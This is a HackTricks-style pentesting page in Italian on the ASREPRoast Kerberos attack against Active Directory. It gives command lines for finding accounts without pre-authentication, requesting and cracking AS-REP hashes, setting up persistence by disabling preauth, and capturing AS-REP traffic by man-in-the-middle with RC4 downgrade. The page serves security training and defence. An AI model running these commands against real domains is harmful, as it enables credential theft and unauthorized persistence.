# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast è un attacco di sicurezza che sfrutta gli utenti che mancano dell'**attributo richiesto per la pre-autenticazione Kerberos**. Fondamentalmente, questa vulnerabilità consente agli attaccanti di richiedere l'autenticazione per un utente dal Domain Controller (DC) senza bisogno della password dell'utente. Il DC risponde quindi con un messaggio crittografato con la chiave derivata dalla password dell'utente, che gli attaccanti possono tentare di decifrare offline per scoprire la password dell'utente.

I principali requisiti per questo attacco sono:

- **Mancanza di pre-autenticazione Kerberos**: Gli utenti target non devono avere questa funzionalità di sicurezza abilitata.
- **Connessione al Domain Controller (DC)**: Gli attaccanti hanno bisogno di accesso al DC per inviare richieste e ricevere messaggi crittografati.
- **Account di dominio opzionale**: Avere un account di dominio consente agli attaccanti di identificare più efficientemente gli utenti vulnerabili tramite query LDAP. Senza un tale account, gli attaccanti devono indovinare i nomi utente.

#### Enumerare gli utenti vulnerabili (necessita credenziali di dominio)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Richiesta messaggio AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting con Rubeus genererà un 4768 con un tipo di crittografia di 0x17 e un tipo di preautenticazione di 0.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistenza

Forza **preauth** non richiesta per un utente dove hai permessi **GenericAll** (o permessi per scrivere proprietà):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASREProast senza credenziali

Un attaccante può utilizzare una posizione man-in-the-middle per catturare i pacchetti AS-REP mentre attraversano la rete senza fare affidamento sulla disabilitazione della pre-autenticazione Kerberos. Funziona quindi per tutti gli utenti sulla VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) ci consente di farlo. Inoltre, lo strumento costringe le workstation client a utilizzare RC4 alterando la negoziazione Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Riferimenti

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

{{#include ../../banners/hacktricks-training.md}}
